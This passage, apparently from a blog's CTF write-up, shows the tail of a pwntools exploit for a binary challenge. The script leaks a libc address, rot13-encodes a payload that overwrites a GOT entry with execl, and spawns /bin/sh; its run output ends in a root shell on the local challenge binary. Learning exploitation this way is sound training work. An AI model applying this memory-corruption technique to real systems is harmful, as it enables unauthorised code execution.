</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info( <span style="color:#e6db74">&#34;Leak puts+11 @  &#34;</span> <span style="color:#f92672">+</span> hex(u32(leak_puts_11)) )
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(leak_puts_11) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Libc base @ &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address)) 
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info( <span style="color:#e6db74">&#34;Addr system @ &#34;</span> <span style="color:#f92672">+</span>  hex( libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) ) 
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info( <span style="color:#e6db74">&#34;Addr execl @ &#34;</span> <span style="color:#f92672">+</span>  hex( libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;execl&#39;</span>]) ) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size: &#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;data: &#34;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += rot13_f( p32( libc_base + libc.symbols[&#39;execl&#39;]))</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> rot13_f( p32( libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;execl&#39;</span>]))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += rot13_f( p32( libc_base + libc.symbols[&#39;system&#39;]))</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += b&#34;A&#34;*8</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32( exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;memset&#39;</span>] )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
<p>And when we run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/user/Desktop/training/ctf-challs/pwnyracing/chall01/solution/chall01/chall01/chall01_patched&#39;</span>: pid <span style="color:#ae81ff">373291</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;resp: NNNN\x80\xbd\xf0\xf7\x87(\xad\xfb\xb8\x18\xeb\xff \xbe\xf2\xf7X\xab\xd9\xf7\n&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Leak puts+11 @  0xf7d9ab4b
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Libc base @ 0xf7d33000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Addr system @ 0xf7d70200
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Addr execl @ 0xf7df2870
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>resp: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>more? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span>: 
</span></span><span style="display:flex;"><span>size: data: resp: /ova/fu
</span></span><span style="display:flex;"><span>more? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span>: $ ls
</span></span><span style="display:flex;"><span>chall01  chall01_patched  core    ld-2.27.so  libc.so.6  solve.py  test.py
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall01  chall01_patched  core    ld-2.27.so  libc.so.6  solve.py  test.py
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ 
</span></span></code></pre></div><p>That is all for this first challenge. Hope that you enjoyed it. Bye and See you next time for a new challenge.</p>
]]></content></item></channel></rss>